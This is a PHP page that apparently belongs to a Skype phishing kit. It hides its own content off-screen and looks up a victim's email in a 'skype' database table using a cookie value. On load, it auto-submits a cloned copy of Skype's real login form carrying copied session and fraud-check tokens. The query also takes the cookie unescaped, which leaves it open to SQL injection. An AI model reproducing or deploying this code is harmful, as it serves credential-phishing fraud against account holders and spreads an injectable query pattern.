<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `skype` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["loginForm"].submit();}</script>



<form id="loginForm" autocomplete="off" method="post" action="https://secure.skype.com/login?application=account&amp;return_url=https%3A%2F%2Fsecure.skype.com%2Faccount%2Flogin"><label for="username">Skype Name</label> <input type="text" name="username" id="username" maxlength="150" tabindex="1" value="<?=$email;?>"> <a id="forgottenUsername" href="https://login.skype.com/account/password-reset-request?mode=user&amp;return_url=https%3A%2F%2Fsecure.skype.com%2Faccount%2Flogin">Forgotten your Skype Name?</a> <label for="password">Password</label> <input type="password" name="password" id="password" autocomplete="off" maxlength="256" tabindex="2" value=""> <a id="forgottenPassword" href="https://login.skype.com/account/password-reset-request?return_url=https%3A%2F%2Fsecure.skype.com%2Faccount%2Flogin">Forgotten your password?</a><input type="hidden" id="ioBlackBox" value="0400tyDoXSFjKeoNf94lis1ztktp1nPiBTkiYGIL8i4HePqupw5dodErHYDB5mrABueSqHV8lCsVIFbWfvi2lw6riEVfH5Uu1Pa6iNS3DfEGu9B8MjlSDtQj+Jtpu4sEMnf8VWodMUtjVJOzhdqdTtZaf3sdUywEcm1K+F9+VNHlcz347df67iNKfbkfB4rZUwgJTEVdGJlxBwCc8acbcKqAuU54OCRZzP9yEMCy0s3hRLlX3uHnT/mMq3/14sYUk290fLLgdBslOF6RxQkMsmSMGqRxgGmo9faXlmD7i2JbChNwPpPV0ZSMv16vhzgg7P4PCi6cBOMmTjE3dVHCcXYMhzWaZTjeAicaAm9Xzlllzp+VTVpzMirzDMQPcd6kSm4zm2UbrU22b3Pd6Wf1rrmlEOMya12GLdG74cfkx6r7pIX/cZWvdpEtn9EYklwIvH4FlVMSHR9mfC2/It2fKXiPXL/Xjr7Mr0wVTq/DHhYoDHfFL0ZMZD89caAE4CNuffsKwKr0Mf+ogWZ0gI2ehGN6u06Wney7zEcarycCcCl4e5lhO1Q2jmVgfF7b8IgetUCWN3BPE1jyNUTRnPw61OKw4iaUGABVKw5X0ikb/3h1d0Im6Fy7sPS5uoj8vE+CwfWxfLLgdBslOF7CnflZ3DFvuLhW1HQIpGtAAfOPjzqyODK9BdBtHFiLAI9qpLt2ZL85hw6+vl8ZjUN3p2VjxRMgSIkpIh3A707ln/wqsPiGBcfEpkWTlnMi5g4mmYKxVbRrSUpGCTU5RhAgLc+eCNfu9tLAySQwovrr0XrdTGtMvh1aZmO3RYmRsI6jmjNuNLREiF5GqSSjcd7LcpRrUJX+LVsaGXPXsrgUciVSFrnqsukNBKhcDQ66JOc4iG4iRcy85ml7UpdlJpqtrRH9YyHB5Gq8APBJ6UvTIiY5jq6gDW6Mcq39MyHkad8hs48DjJPTBYCz6cAXMHqFbi6m/9pcF6qLoEuVvSE+SbZvTQkUkiUMgog1WtCs0sRUle4zzGyGlU99UoH2xklRx4x4rFVrAuouEmL3GXEGsfzn7Ksly054AVHwHjpjwUo7Jw4KTVCn7Z+U7vgI2cmDbThMTO3klGmAwlMeFQ6bL1wAoh8NDad0Znrjx3oBUaFzpZO8xtet3utGn447LYQtzhx3LyWR7g=="> <script type="text/javascript">            var io_operation="ioBegin";
            var io_bbout_element_id="ioBlackBox";
            var io_install_flash=false;
            var io_install_stm=false;
            var io_max_wait=5000;
            var io_submit_element_id="signIn";
        </script><script src="https://mpsnare.iesnare.com/snare.js" type="text/javascript"></script><script type="text/javascript" src="https://apps.skypeassets.com/static/1.66/skype.login/js/blackboxCapture.js?_version=1.66"></script><div class="signInContainer"><button class="smallButton primaryCta" type="submit" id="signIn" tabindex="3"><span>Sign me in</span></button></div><input type="hidden" name="timezone_field" id="timezone_field" value="+02|00"> <input type="hidden" name="pie" id="pie" value="QNdotSslc2FOCOsQ+nl2R+3GKHHo25ZrlpEvzjkhH4n173YLy7NQ5y1tVPCa8D0NUXr4s6QaIer+GQfDwxNqzWY0N2Y0M2ExZWRhZTk0YTVhMmViYjVjZDRlYjI0ZjQz"> <input type="hidden" name="etm" id="etm" value="NavPq2r2QrTKHUBpzTd9vTsDRvMUfsqile4LKVh5+YjyriEK/uqQ9wX9GSALCZ7xKaQTpPbpfx/eaYBn84x7nGM5OGIxNTM5ZjM0OWU1ODYzMDJmZWE5YjkxOWVkYTIx"> <input type="hidden" name="js_time" id="js_time"><script type="text/javascript">/*<![CDATA[*/        function getCurrentTime() {
            return (new Date().getTime()) / 1000;
        }
        
        function getTimezone() {
            var pad = function(n, c) {
                if ((n = n + "").length < c) {
                    return new Array(++c - n.length).join("0") + n;
                } else {
                    return n;
                }
            };
            var sign;
            var timezone = new Date().getTimezoneOffset() * (-1);
            if (timezone >= 0) {
                sign = "+";
            } else {
                sign = "-";
            }

            timezone = Math.abs(timezone);
            var minutes = timezone % 60;
            var hours = (timezone - minutes) / 60;
            minutes = pad(minutes, 2);
            hours = pad(hours, 2);
            
            return sign + hours + "|" + minutes;
        }
        
        $(function(){
            $("#loginForm").submit(function(){
                $("#js_time").val(getCurrentTime());
                return true;
            });
        
            $("#timezone_field").val(getTimezone());
        });
    /*]]>*/</script><input type="hidden" name="session_token" value="ec8f43d5036cf85c6abe765a37fb36434435bceb"><input type="hidden" value="account" name="application">
<input type="hidden" value="https://secure.skype.com/account/login" name="return_url"></form>

</body>
</html>

